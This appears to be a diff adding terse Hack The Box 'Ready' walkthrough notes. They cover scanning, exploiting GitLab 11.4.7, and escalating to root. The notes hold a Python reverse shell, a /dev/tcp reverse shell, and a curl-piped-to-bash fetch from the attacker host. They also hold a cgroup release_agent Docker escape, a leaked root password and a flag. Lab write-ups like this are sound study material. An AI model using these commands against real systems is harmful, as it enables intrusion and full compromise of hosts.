@@ -1,0 +1,160 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.220
+result:
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack ttl 63
+5080/tcp open  onscreen syn-ack ttl 62
+
+command: sudo nmap -sSVC -A -p 22,5080 10.10.10.220
+result:
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+5080/tcp open  http    nginx
+| http-robots.txt: 53 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://10.10.10.220:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.220:5080//help
+register login and access again http://10.10.10.220:5080//help
+take attention:
+ GitLab Community Edition 11.4.7 
+
+access: https://github.com/xenophil90/edb-49263-fixed
+clone gitlab and run the python script.
+
+step one download shell to target machine
+command: sudo python3 -m http.server 80
+command: python3 49263.py -U 0xdf -P 'passadaaja' -l 10.10.16.19 -p 7979
+choose option one
+command: cat shell.py
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.19",7979));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); 
+
+step two execute shell.py on target machine
+command: nc -lvnp 7979
+command: python3 49263.py -U 0xdf -P 'passadaaja' -l 10.10.16.19 -p 7979
+choose option two
+
+upgrade shell
+
+command: /opt/backup
+command: cat docker-compose.yml 
+version: '2.4'
+
+services:
+  web:
+    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
+    restart: always
+    hostname: 'gitlab.example.com'
+    environment:
+      GITLAB_OMNIBUS_CONFIG: |
+        external_url 'http://172.19.0.2'
+        redis['bind']='127.0.0.1'
+        redis['port']=6379
+        gitlab_rails['initial_root_password']=File.read('/root_pass')
+    networks:
+      gitlab:
+        ipv4_address: 172.19.0.2
+    ports:
+      - '5080:80'
+      #- '127.0.0.1:5080:80'
+      #- '127.0.0.1:50443:443'
+      #- '127.0.0.1:5022:22'
+    volumes:
+      - './srv/gitlab/config:/etc/gitlab'
+      - './srv/gitlab/logs:/var/log/gitlab'
+      - './srv/gitlab/data:/var/opt/gitlab'
+      - './root_pass:/root_pass'
+      - '/opt/user:/home/dude/'
+    privileged: true
+    restart: unless-stopped
+    #mem_limit: 1024m
+
+networks:
+  gitlab:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.19.0.0/16
+
+command: cat gitlab.rb | grep -v "^#" | grep .
+result: wW59U!ZKMbG9+*#h
+
+command: su -
+password: wW59U!ZKMbG9+*#h
+
+command: cd /opt/backup
+command: cat docker-compose.yml 
+version: '2.4'
+
+services:
+  web:
+    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
+    restart: always
+    hostname: 'gitlab.example.com'
+    environment:
+      GITLAB_OMNIBUS_CONFIG: |
+        external_url 'http://172.19.0.2'
+        redis['bind']='127.0.0.1'
+        redis['port']=6379
+        gitlab_rails['initial_root_password']=File.read('/root_pass')
+    networks:
+      gitlab:
+        ipv4_address: 172.19.0.2
+    ports:
+      - '5080:80'
+      #- '127.0.0.1:5080:80'
+      #- '127.0.0.1:50443:443'
+      #- '127.0.0.1:5022:22'
+    volumes:
+      - './srv/gitlab/config:/etc/gitlab'
+      - './srv/gitlab/logs:/var/log/gitlab'
+      - './srv/gitlab/data:/var/opt/gitlab'
+      - './root_pass:/root_pass'
+      - '/opt/user:/home/dude/'
+    privileged: true
+    restart: unless-stopped
+    #mem_limit: 1024m
+
+networks:
+  gitlab:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.19.0.0/16
+
+docker container escapse, read this:
+https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+
+let's create shell.sh
+#!/bin/bash
+
+bash >& /dev/tcp/10.10.16.19/4444 0>&1
+
+host> nc -lvnp 4444
+
+root@gitlab:/opt/backup# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+root@gitlab:/opt/backup# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
+root@gitlab:/opt/backup# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+command: echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.16.19/shell.sh | bash' >/c;
+command: chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
+
+command: cat /root/root.txt
+2390b1a61ec1f77a7318e038c9195ed1
+
+resource:
+https://0xdf.gitlab.io/2021/05/15/htb-ready.html
+
+https://binsec.nl/hack-the-box-ready-10-10-10-220/
